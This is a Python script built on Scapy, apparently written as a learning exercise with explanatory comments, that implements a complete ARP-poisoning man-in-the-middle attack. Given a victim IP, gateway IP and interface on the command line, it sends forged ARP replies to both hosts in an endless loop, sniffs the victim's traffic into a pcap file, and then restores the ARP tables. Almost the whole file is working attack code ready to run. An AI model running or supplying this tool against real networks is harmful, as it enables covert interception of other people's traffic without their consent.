from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)



import os
import sys
import time


def get_mac(targetip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip) # Ether is used to create Layer 2 ethernet frame, ff::ff is the broadcast mac address, 
                                                                             # ARP() creates arp packet, op=who-has means ARP request, pdst = target destination ip we are asking about
                                                                             # / combines (ethernet + arp) layer into one packet.       
    
    
    resp, _ = srp(packet, timeout=2, retry=10, verbose =False) # srp = send and receive layer 2 packets, watits 2 sec per try, retries 10 times if there is no response
                                                               # resp = contain list of send and received packet pairs, _ ignore the unanswered packets
    for _, r in resp:
        return r[Ether].src                           #from the response list, we are extracing the source mac address.
    return None


class Arper:
    def __init__(self, victim, gateway, interface='Ethernet'):
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac= get_mac(gateway)
        self.interface= interface
        conf.verb = 0
        
        print(f'Selected {interface}')
        print(f'Gateway({gateway} is at {self.gatewaymac})')
        print(f'Victim {victim} at {self.victimmac}')
        print('-'*30)



    
    
    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        self.sniff_thread = Process(target= self.sniff)
        self.sniff_thread.start()
    
    def poison(self):
        poison_victim = ARP()
        poison_victim.op =2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac
        print(f'ip src: {poison_victim.psrc}')
        print(f'ip dst: {poison_victim.pdst}')
        print(f'mac dst: {poison_victim.hwdst}')
        print(f'mac src: {poison_victim.hwsrc}')
        print(poison_victim.summary())
        print('='*30)
        
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac
        print(f'ip src: {poison_gateway.psrc}')
        print(f'ip dst: {poison_gateway.pdst}')
        print(f'mac dst: {poison_gateway.hwdst}')
        print(f'mac_src: {poison_gateway.hwsrc}')
        print(poison_gateway)
        print(f'Beginning the ARP poisoning')
        
        
        
        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)

            except KeyboardInterrupt:
                self.restore()
                self.exit()
        
            else:
                time.sleep(2)


    def sniff(self, count=100):
        time.sleep(5)
        print(f'sniffing {count} packets')
        bpf_filter = "ip host %s" % self.victim

        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        wrpcap('arper.pcap', packets)

        self.restore()
        self.poison_thread.terminate()
        print('Finished')
    
    def restore(self):
        print('Restoring ARP tables....')
        #send(ARP(op=2,psrc=self.gateway, hwsrc=self.gatewaymac,pdst=self.victim, hwdst='ff:ff:ff:ff:ff:ff'), count=5)
        send(Ether(dst=self.victimmac)/ARP(op=2, psrc=self.gateway, hwsrc=self.gatewaymac, pdst=self.victim, hwdst=self.victimmac), count=5)

        
        #send(ARP(op=2, psrc=self.victim, hwsrc=self.victimmac, pdst=self.gateway, hwdst='ff:ff:ff:ff:ff:ff'), count=5)
        send(Ether(dst=self.gatewaymac)/ARP(op=2, psrc=self.victim, hwsrc=self.victimmac, pdst=self.gateway, hwdst=self.gatewaymac), count=5)

    
    
if __name__ == '__main__':
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])

    myarp = Arper(victim, gateway, interface)

    myarp.run()
    
    
'''  
mac = get_mac("192.168.1.95")
if mac:
    
    
    print(f"mac address is {mac} ")
    
    
else:
    print("No response")
    
    
    '''